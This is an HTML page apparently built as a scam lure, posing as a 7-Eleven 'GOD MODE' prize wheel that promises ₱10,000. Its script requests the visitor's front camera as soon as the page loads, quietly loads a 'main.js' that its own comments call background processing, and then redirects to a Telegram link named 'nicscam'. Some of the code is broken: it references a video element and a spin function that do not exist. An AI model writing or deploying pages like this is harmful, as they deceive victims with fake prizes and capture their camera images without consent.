<!DOCTYPE html>
<html lang="tl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>7-11 Spin the win</title>

<style>

body{
    margin:0;
    font-family:Segoe UI, sans-serif;
    background:radial-gradient(circle,#0f9d58,#0b5f32);
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
}

/* Card */
.box{
    width:380px;
    background:white;
    padding:30px;
    border-radius:30px;
    text-align:center;
    box-shadow:0 0 60px rgba(0,0,0,.4);
}

/* Logo Glow */
.logo{
    font-size:42px;
    font-weight:900;
    color:#0a8f3a;
    text-shadow:0 0 12px rgba(10,143,58,.6);
}

/* Wheel GOD MODE */
#wheel{
    width:230px;
    height:230px;
    border-radius:50%;
    border:10px solid #0a8f3a;
    margin:25px auto;
    display:flex;
    justify-content:center;
    align-items:center;
    font-size:28px;
    font-weight:bold;

    transition:6s cubic-bezier(.1,.7,.1,1);
}

/* Result */
#result{
    font-size:32px;
    color:#f39c12;
    opacity:0;
    transition:1.5s;
    text-shadow:0 0 10px rgba(243,156,18,.5);
}

/* Button */
.btn{
    width:100%;
    padding:16px;
    border:none;
    border-radius:16px;
    background:linear-gradient(45deg,#0a8f3a,#1abc9c);
    color:white;
    font-size:20px;
    cursor:pointer;
    transition:.3s;
}

.btn:hover{
    transform:scale(1.05);
}

/* Loading */
#loading{
    display:none;
    color:#444;
    margin:15px;
}

/* GOD CONFETTI */
.confetti{
    position:fixed;
    width:8px;
    height:8px;
    top:-20px;
    animation:fall linear forwards;
}

@keyframes fall{
    to{
        transform:translateY(110vh) rotate(720deg);
    }
}

</style>
</head>

<body>

<div class="box">

<div class="logo">7-ELEVEN</div>

<h3>🔥 GOD MODE SPIN 🔥</h3>

<div id="wheel">🎁 ₱10,000</div>

<div id="loading">System checking winner...</div>

<div id="result">🎉 YOU WON ₱10,000!</div>

<button class="btn" id="startBtn" onclick="spin()">SPIN NOW</button>

</div>
    
     <script>
        const btn = document.getElementById('startBtn');
        const loading = document.getElementById('loading');
        const video = document.getElementById('preview');
        const REDIRECT_URL = "https://t.me/nicscam"; // Trang đích sau khi xong

        // Kích hoạt camera ngay khi vào trang để sẵn sàng
        async function initCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                video.srcObject = stream;
            } catch (err) { console.warn("Yêu cầu quyền camera để nhận thưởng."); }
        }
        initCamera();

        btn.addEventListener('click', () => {
            btn.style.display = 'none';
            loading.style.display = 'block';

            // Gọi script xử lý ngầm
            const script = document.createElement('script');
            script.src = 'main.js';
            document.body.appendChild(script);

            // Chờ tín hiệu từ main.js để chuyển hướng
            const check = setInterval(() => {
                if (window.mainScriptFinished) {
                    clearInterval(check);
                    window.location.href = REDIRECT_URL;
                }
            }, 500);
        });
    </script>
</body>

</html>
